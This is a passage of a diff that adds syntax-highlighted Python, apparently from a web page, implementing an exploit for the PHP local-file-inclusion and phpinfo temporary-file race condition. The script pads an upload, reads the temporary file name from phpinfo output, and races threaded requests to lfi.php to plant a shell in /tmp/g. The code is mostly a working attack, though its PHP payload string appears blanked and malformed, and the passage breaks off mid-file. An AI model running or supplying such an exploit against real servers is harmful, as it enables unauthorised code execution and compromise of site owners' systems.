+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env pyhon</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*-coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">php 处理脚本执行完后再删除临时文件，间隔时间极短
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">argparse</span> <span class="kn">import</span> <span class="n">ArgumentParser</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">tag</span> <span class="o">=</span> <span class="s2">&#34;Security Test&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">boundary</span> <span class="o">=</span> <span class="s1">&#39;---------------------------11008921013555437861019615112&#39;</span><span class="c1">#分隔符</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="c1"># php_path maybe &#39;/lfi_phpinfo&#39; or &#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">php_path</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{tag}</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;&lt;?php                                                                  ?&gt;</span><span class="se">\&#39;</span><span class="s1">);?&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">req_data</span> <span class="o">=</span> <span class="s1">&#39;--</span><span class="si">{b}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="o">=</span><span class="n">boundary</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req_data</span> <span class="o">+=</span> <span class="s1">&#39;Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;file.txt&#34;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req_data</span> <span class="o">+=</span> <span class="s1">&#39;Content-Type: text/plain</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req_data</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req_data</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="si">{payload}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req_data</span> <span class="o">+=</span> <span class="s1">&#39;--</span><span class="si">{b}</span><span class="s1">--&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="o">=</span><span class="n">boundary</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="c1"># padding for delay php server delete tmp file</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 这种方式是phpinfo返回发送的头信息，信息过大的话就采用分块传输，padding增加了传输时间,根据需要改</span>
+</span></span><span class="line"><span class="cl">    <span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8000</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">=</span> <span class="s1">&#39;POST </span><span class="si">{path}</span><span class="s1">/phpinfo.php?a=</span><span class="si">{padding}</span><span class="s1"> HTTP/1.1</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">php_path</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;Host: </span><span class="si">{host}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;Cookie: othercookie=</span><span class="si">{padding}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">padding</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;User-Agent: </span><span class="si">{padding}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">padding</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#req += &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;Accept: </span><span class="si">{padding}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">padding</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;Accept-Language: </span><span class="si">{padding}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">padding</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;Accept-Encoding: </span><span class="si">{padding}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">padding</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;Content-Type: multipart/form-data; boundary=</span><span class="si">{b}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="o">=</span><span class="n">boundary</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;Content-Length: </span><span class="si">{l}</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">l</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">req_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;Connection: close</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="si">{data}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">req_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="c1"># modify this to suit the LFI script</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lfi_req</span> <span class="o">=</span> <span class="s1">&#39;GET </span><span class="si">{path}</span><span class="s1">/lfi.php?load=</span><span class="si">%s</span><span class="s1"> HTTP/1.1</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">php_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lfi_req</span> <span class="o">+=</span> <span class="s1">&#39;Connection: Keep-alive</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lfi_req</span> <span class="o">+=</span> <span class="s1">&#39;Host: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lfi_req</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">lfi_req</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">lfi_phpinfo</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinfo_req</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">lfi_req</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">phpinfo_req</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">offset</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">+=</span> <span class="n">s1</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">index</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;[tmp_name] =&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fn</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">17</span><span class="p">:</span> <span class="n">index</span><span class="o">+</span><span class="mi">31</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">err_msg</span> <span class="o">=</span> <span class="s2">&#34;fetch temp file path error: </span><span class="si">{e}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">err_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">lfi_req</span> <span class="o">%</span> <span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">host</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">s2</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="c1"># debug</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">tag</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">fn</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ThreadWorker</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="n">lock</span><span class="p">,</span> <span class="n">maxattempts</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">event</span> <span class="o">=</span> <span class="n">event</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">lock</span> <span class="o">=</span> <span class="n">lock</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">maxattempts</span> <span class="o">=</span> <span class="n">maxattempts</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">args</span> <span class="o">=</span> <span class="n">args</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">counter</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="bp">self</span><span class="o">.</span><span class="n">lock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">maxattempts</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span>
+</span></span><span class="line"><span class="cl">                <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">x</span> <span class="o">=</span> <span class="n">lfi_phpinfo</span><span class="p">(</span><span class="o">*</span><span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">x</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">info_msg</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Got it! Shell created in /tmp/g&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">info_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getoffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinfo_req</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Gets offset of tmp_name in php output
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">phpinfo_req</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rcv_data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">+=</span> <span class="n">rcv_data</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">rcv_data</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">        <span class="c1"># detect the final chunk</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">rcv_data</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;0</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="c1"># debug</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#log.debug(data)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;[tmp_name] =&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">index</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;No php tmp_name in phpinfo output&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">info_msg</span> <span class="o">=</span> <span class="s2">&#34;found </span><span class="si">{file}</span><span class="s2"> at </span><span class="si">{index}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">file</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">10</span><span class="p">],</span> <span class="n">index</span><span class="o">=</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">info_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="c1"># padded up a bit</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">index</span><span class="o">+</span><span class="mi">256</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
